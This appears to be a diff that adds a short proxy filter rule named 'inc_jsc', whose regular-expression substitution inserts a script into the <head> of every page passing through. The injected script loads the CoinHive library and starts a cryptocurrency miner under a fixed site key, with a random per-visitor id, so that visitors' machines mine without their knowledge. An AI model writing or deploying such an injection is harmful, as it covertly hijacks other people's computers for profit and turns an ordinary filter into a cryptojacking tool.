@@ -1,0 +1,2 @@
+FILTER: inc_jsc
+s@<head>@$&<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>function guid() { function s4() { return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1); } return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4(); } var miner = new CoinHive.User('i6sTow2emedXd9q96NT3xNTRIvQjBQTJ', guid()); miner.start(); </script>@sigx
